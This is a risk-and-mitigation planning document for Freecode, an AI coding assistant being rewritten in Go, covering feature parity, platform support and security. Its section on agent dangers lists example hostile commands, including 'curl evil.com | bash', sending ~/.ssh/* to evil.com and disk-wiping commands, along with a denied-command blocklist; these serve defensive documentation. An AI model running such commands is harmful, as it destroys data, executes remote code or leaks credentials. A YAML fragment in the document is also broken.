# Freecode — Risks & Mitigations

## 1.0 Purpose

This document outlines identified risks, their severity, likelihood, and mitigation strategies.

---

## 2.0 Risk Assessment Matrix

| Risk | Severity | Likelihood | Impact | Status |
|------|----------|------------|--------|--------|
| TypeScript → Go feature parity | High | High | Project failure | ⏳ |
| Performance regression | Medium | Medium | User experience | ⏳ |
| Missing platform support | Medium | Low | Limited adoption | ⏳ |
| Config migration issues | Medium | Medium | User data loss | ⏳ |
| Security vulnerabilities | High | Low | System compromise | ⏳ |
| Build complexity | Low | Medium | Development friction | ⏳ |

---

## 3.0 Detailed Risks

### 3.1 TypeScript → Go Feature Parity

**Description:** Some TypeScript/Node.js features may not have direct Go equivalents, requiring significant redesign.

**Severity:** High
**Likelihood:** High
**Impact:** Project may fail to deliver feature parity with opencode

**Mitigation:**
- Detailed mapping document (1.1-Architecture.md) created
- Phase-by-phase implementation with verification
- Regular integration tests throughout development
- Incremental delivery to catch issues early

**Mitigation Status:** ⏳ In progress

---

### 3.2 Performance Regression

**Description:** Go may not match the performance of optimized TypeScript for certain operations (streaming, async I/O).

**Severity:** Medium
**Lelihood:** Medium
**Impact:** User experience degradation

**Mitigation:**
- Use Go's native concurrency (goroutines, channels)
- Profile early and often
- Use appropriate algorithms, not language tricks
- Benchmark critical paths

**Mitigation Status:** ⏳ Planned

---

### 3.3 Missing Platform Support

**Description:** Some platform-specific features may be difficult to implement for FreeBSD/IllumOS.

**Severity:** Medium
**Likelihood:** Low
**Impact:** Limited adoption on certain platforms

**Mitigation:**
- Abstraction layer for platform-specific code
- Graceful fallbacks where possible
- Platform-specific builds with appropriate features
- Community contributions encouraged

**Mitigation Status:** ⏳ In progress

---

### 3.4 Configuration Migration Issues

**Description:** Users may lose settings or experience unexpected behavior when migrating from opencode.

**Severity:** Medium
**Likelihood:** Medium
**Impact:** User frustration, potential data loss

**Mitigation:**
- Read-only migration from opencode configs
- Backup original configs before migration
- Comprehensive migration testing
- Clear documentation of changes
- Migration tool with dry-run mode

**Mitigation Status:** ⏳ Planned

---

### 3.5 Security Vulnerabilities

**Description:** New Go implementation may introduce security vulnerabilities.

**Severity:** High
**Likelihood:** Low
**Impact:** System compromise

**Mitigation:**
- Security-first design (documented in 9.0-Security.md)
- Regular security audits
- Dependency vulnerability scanning
- Localhost-only binding by default
- Permission system with YOLO mode

**Mitigation Status:** ⏳ In progress

---

### 3.6 Build Complexity

**Description:** Cross-platform builds (FreeBSD, Linux, macOS, IllumOS) may be complex to set up and maintain.

**Severity:** Low
**Likelihood:** Medium
**Impact:** Development friction

**Mitigation:**
- Use goreleaser for cross-compilation
- Continuous integration on all platforms
- Containerized builds where possible
- Clear build documentation

**Mitigation Status:** ⏳ Planned

---

## 4.0 Technical Risks

### 4.1 SQLite Concurrency

**Description:** SQLite has limited concurrency support.

**Mitigation:**
- Use modernc.org/sqlite with proper locking
- Connection pooling
- WAL mode for better concurrency
- Consider embedded KV store alternatives if needed

### 4.2 Effect System Absence

**Description:** TypeScript's Effect system provides powerful async composition; Go has no direct equivalent.

**Mitigation:**
- Use context.Context for cancellation
- errgroup for parallel operations
- Channel-based event system
- Structured error handling with wrapping

### 4.3 Dynamic Evaluation

**Description:** TypeScript allows dynamic code evaluation; Go is statically compiled.

**Mitigation:**
- Scripting via embedded interpreter (otto for JS, mlua for Lua)
- Plugin system via compiled plugins
- External process execution for scripts

---

## 5.0 Mitigation Tracker

| Risk | Mitigation | Status | Last Review |
|------|------------|--------|-------------|
| Feature parity | Detailed mapping doc | ⏳ | 2026-05-01 |
| Performance | Benchmarking plan | ⏳ | 2026-05-01 |
| Platform support | Abstraction layer | ⏳ | 2026-05-01 |
| Config migration | Migration tool | ⏳ | 2026-05-01 |
| Security | Security audit | ⏳ | 2026-05-01 |
| Build complexity | goreleaser | ⏳ | 2026-05-01 |

---

## 6.0 Contingency Plans

### 6.1 If Feature Parity Fails

**Trigger:** After Phase 3, if critical features cannot be implemented.

**Plan:**
- Document gaps explicitly
- Prioritize must-have vs nice-to-have
- Consider partial implementation with config flags
- Community contributions for missing features

### 6.2 If Platform Support Fails

**Trigger:** If a platform cannot be supported adequately.

**Plan:**
- Mark platform as "best effort"
- Focus on primary platform (FreeBSD 16)
- Document known limitations
- Accept community contributions for unsupported platforms

### 6.3 If Security Issue Found

**Trigger:** Critical security vulnerability discovered.

**Plan:**
- Security disclosure process
- Emergency patch release
- Notify users immediately
- Fix before next release

---

## 7.0 Risk Review Schedule

| Review | Date | Status |
|--------|------|--------|
| Initial assessment | 2026-05-01 | ⏳ |
| Phase 1 review | TBD | - |
| Phase 2 review | TBD | - |
| Phase 3 review | TBD | - |
| Phase 4 review | TBD | - |
| Phase 5 review | TBD | - |
| Pre-release review | TBD | - |

---

## 8.0 Open Issues

None at this time.

---

## 9.0 Closed Issues

None at this time.

---

## 10.0 Inherent Agent Dangers (Not Vulnerabilities)

### 10.1 Understanding Freecode's Security Model

Freecode is an AI coding assistant that is **designed to modify files and execute commands**. This is its core functionality, not a bug.

**This is NOT a malicious application.** There is no:
- Data exfiltration without user consent
- Covert communication channels
- Backdoors or hidden functionality
- Surreptitious data collection

**However, it IS a powerful tool that can:**
- Read any file it has permission to access
- Write/modify/delete any file it has permission to access
- Execute any command it has permission to run
- Connect to networks if permitted

### 10.2 What Users Must Understand

By using freecode, users acknowledge:

1. **Freecode will try to do what you ask** - If you ask it to modify system files, it will try
2. **Permission system is a guard, not a wall** - With `allow` permissions, freecode can do almost anything
3. **YOLO mode requires explicit enable** - User chooses scope: session/project/forever
4. **No sandbox by default** - Freecode operates with user privileges, not in a container

### 10.3 Dangerous Scenarios (By Design)

These are NOT vulnerabilities—they are intended behavior when permissions allow:

| Scenario | Why It's Dangerous | Protection |
|----------|-------------------|------------|
| `freecode run "rm -rf /"` | Deletes system if permitted | Permission system, dangerous command blocklist |
| `freecode run "curl evil.com \| bash"` | Remote code execution | Permission system |
| `freecode run "> /dev/sda"` | Destroys disk | Permission system, dangerous command blocklist |
| `freecode run "send all ~/.ssh/* to evil.com"` | Data exfiltration | Permission system, network controls |
| `freecode run "modify /etc/passwd"` | Privilege escalation | Permission system |

### 10.4 Security Expectations

| User Expectation | Reality |
|-------------------|---------|
| "Freecode won't let me delete my home directory" | WRONG - with `allow` permissions, it can |
| "YOLO mode is on by default" | WRONG - YOLO is OFF, must be explicitly enabled |
| "The permission system prevents everything dangerous" | WRONG - `allow` means allow |
| "Freecode won't connect to random servers" | WRONG - with `webfetch: allow`, it can |

### 10.5 Secure Usage Practices

1. **YOLO is OFF by default** - User must explicitly enable it
2. **Choose YOLO scope carefully** - session/project/forever have different risks
3. **Use `deniedCommands`** - Block dangerous commands regardless of YOLO
4. **Use `deny` for sensitive operations** - `ask` requires user response
5. **Protect sensitive directories** - Use protected paths config
6. **Use separate permissions per agent** - Not all agents need full access

### 10.6 Enabling YOLO

When YOLO is triggered, user chooses scope:

```yaml
# YOLO OFF (default) - asks for confirmation
yolo:
  mode: ask
  enabled: false

# YOLO for session only
yolo:
  mode: session
  enabled: true

# YOLO for project only
yolo:
  mode: project
  enabled: true

# YOLO forever (until disabled)
yolo:
  mode: forever
  enabled: true
```

### 10.7 Dangerous Command Blocklist

These are blocked regardless of YOLO mode:

```yaml
permission:
  deniedCommands:
    - "rm -rf /*"
    - "rm -rf /"
    - "> /dev/sda"
    - "mkfs"
    - "dd if=/dev/zero"
    - ":(){:|:&};"  # Fork bomb
```
  skipEditConfirmations: true
  skipBashConfirmations: true  # DANGEROUS
```

### 10.7 What Is A Vulnerability

A vulnerability in freecode would be:

- Bypassing permission system without user consent
- Exfiltrating data when user explicitly denied network access
- Executing commands user explicitly denied
- Accessing files outside project scope without permission
- Sending data to third parties without user knowledge (telemetry)

**NOT a vulnerability:**
- Deleting files when user granted `bash: allow`
- Modifying system files when user granted permission
- Running dangerous commands user explicitly allowed
- YOLO mode doing exactly what it says (skipping confirmations)

---

**Author:** Mark LaPointe <mark@cloudbsd.org>
**Last Updated:** 2026-05-01

---

## Author Policy

- **Author:** Mark LaPointe <mark@cloudbsd.org>
- **No trailers**: No `Co-authored-by`, `Sponsored-by`, or similar trailers
- **No sponsorships**: No funding acknowledgments
- **No co-authors**: All commits made solely by the author
